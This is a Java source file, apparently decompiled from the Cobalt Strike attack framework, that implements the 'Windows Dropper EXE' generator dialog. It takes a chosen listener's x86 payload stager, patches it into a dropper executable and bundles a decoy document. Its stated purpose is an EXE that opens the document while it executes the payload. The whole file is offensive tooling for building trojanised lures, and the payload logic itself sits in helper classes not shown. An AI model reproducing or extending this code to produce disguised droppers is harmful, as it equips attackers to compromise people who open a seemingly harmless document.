package aggressor.dialogs;

import aggressor.AggressorClient;
import common.ArtifactUtils;
import common.ListenerUtils;
import dialog.DialogListener;
import dialog.DialogManager;
import dialog.DialogUtils;
import dialog.SafeDialogCallback;
import dialog.SafeDialogs;
import java.awt.event.ActionEvent;
import java.io.File;
import java.util.Map;
import javax.swing.JButton;
import javax.swing.JFrame;

public class WindowsDropperDialog implements DialogListener, SafeDialogCallback {
   protected JFrame dialog = null;
   protected Map options = null;
   protected AggressorClient client = null;
   protected String file;
   protected String name;
   protected String listener;

   public WindowsDropperDialog(AggressorClient var1) {
      this.client = var1;
   }

   public void dialogAction(ActionEvent var1, Map var2) {
      this.file = var2.get("file") + "";
      this.name = var2.get("name") + "";
      this.listener = var2.get("listener") + "";
      File var3 = new File(this.file);
      if (var3.exists() && this.file.length() != 0) {
         if ("".equals(var2.get("name"))) {
            this.name = var3.getName();
         }

         SafeDialogs.saveFile((JFrame)null, "dropper.exe", this);
      } else {
         DialogUtils.showError("I need a file to embed to make a dropper");
      }
   }

   public void dialogResult(String var1) {
      byte[] var2 = ListenerUtils.getListener(this.client, this.listener).getPayloadStager("x86");
      byte[] var3 = (new ArtifactUtils(this.client)).patchArtifact(var2, "dropper32.exe");
      (new ArtifactUtils(this.client)).setupDropper(var3, this.file, this.name, var1);
      DialogUtils.showInfo("Saved Windows Dropper EXE to\n" + var1);
   }

   public void show() {
      this.dialog = DialogUtils.dialog("Windows Dropper EXE", 640, 480);
      DialogManager var1 = new DialogManager(this.dialog);
      var1.addDialogListener(this);
      var1.sc_listener_stagers("listener", "Listener:", this.client);
      var1.file("file", "Embedded File:");
      var1.text("name", "File Name:");
      JButton var2 = var1.action("Generate");
      JButton var3 = var1.help("https://www.cobaltstrike.com/help-windows-dropper");
      this.dialog.add(DialogUtils.description("This package creates a Windows document dropper. This package drops a document to disk, opens it, and executes a payload."), "North");
      this.dialog.add(var1.layout(), "Center");
      this.dialog.add(DialogUtils.center(var2, var3), "South");
      this.dialog.pack();
      this.dialog.setVisible(true);
   }
}
